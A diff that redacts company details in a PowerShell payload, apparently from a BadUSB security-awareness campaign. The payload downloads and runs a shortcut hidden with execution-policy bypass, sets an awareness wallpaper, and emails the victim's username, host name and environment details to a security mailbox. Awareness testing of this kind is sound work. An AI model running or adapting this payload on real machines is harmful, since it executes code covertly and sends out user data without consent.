@@ -1,9 +1,9 @@
-$a = "C:\L1dl";
+$a = "C:\Re3dacted";
 cd $a;
 [console]::beep(2000,500);
 wget https://raw.githubusercontent.com/balazsbanyasz/work/main/alarm.mp3 -o "alarm.mp3";
 wget https://raw.githubusercontent.com/balazsbanyasz/work/main/PS.exe.lnk -o "PS.exe.lnk";
-&"$a\PS.exe.lnk" -WindowStyle hidden -exec bypass -c {$a = "C:\L1dl"; Add-Type -AssemblyName presentationCore;$mediaPLayer = New-Object system.windows.media.mediaplayer;$mediaPlayer.open("$a\alarm.mp3");$mediaPLayer.Volume = 0.9;$mediaPLayer.Play();Start-Sleep -Seconds 15;exit};
+&"$a\PS.exe.lnk" -WindowStyle hidden -exec bypass -c {$a = "C:\Re3dacted"; Add-Type -AssemblyName presentationCore;$mediaPLayer = New-Object system.windows.media.mediaplayer;$mediaPlayer.open("$a\alarm.mp3");$mediaPLayer.Volume = 0.9;$mediaPLayer.Play();Start-Sleep -Seconds 15;exit};
 $rand = (Get-Random -Maximum 4 ) + 1
 wget "https://raw.githubusercontent.com/balazsbanyasz/work/main/BadUSBAwareness$rand.png" -o "BadUSBAwareness$rand.png";
 
@@ -67,4 +67,4 @@ Set-WallPaper -Image "$a\BadUSBAwareness$rand.png" -Style Fit;
 
 & ".\BadUSBAwareness$rand.png";
 
-$name = whoami; $name = $name.substring(3); echo "#awarenessCampaign | BadUSBAwarenessV2 | HWid: duck" >> C:\L1dl\$name.txt; whoami >> C:\L1dl\$name.txt; Get-ChildItem Env: | ft key,Value; $env:COMPUTERNAME >> C:\L1dl\$name.txt; $env:CLIENTTYPE >> C:\L1dl\$name.txt; date >> C:\L1dl\$name.txt; $date = date; $email = ([ADSISEARCHER]"samaccountname=$name").FindOne().Properties.mail; Send-MailMessage -To "iso@lidl.hu" -Subject "$name rubberducky!" -Body "$name $date bedugta a rubber duckyt a gépébe" -SmtpServer '10.68.8.16'-From $email -Attachments "C:\L1dl\$name.txt" -encoding "unicode";
+$name = whoami; $name = $name.substring(3); echo "#awarenessCampaign | BadUSBAwarenessV2 | HWid: duck" >> C:\Re3dacted\$name.txt; whoami >> C:\Re3dacted\$name.txt; Get-ChildItem Env: | ft key,Value; $env:COMPUTERNAME >> C:\Re3dacted\$name.txt; $env:CLIENTTYPE >> C:\Re3dacted\$name.txt; date >> C:\Re3dacted\$name.txt; $date = date; $email = ([ADSISEARCHER]"samaccountname=$name").FindOne().Properties.mail; Send-MailMessage -To "Re3dacted@Re3dacted.hu" -Subject "$name rubberducky!" -Body "$name $date bedugta a rubber duckyt a gépébe" -SmtpServer 'Re3dacted'-From $email -Attachments "C:\Re3dacted\$name.txt" -encoding "unicode";
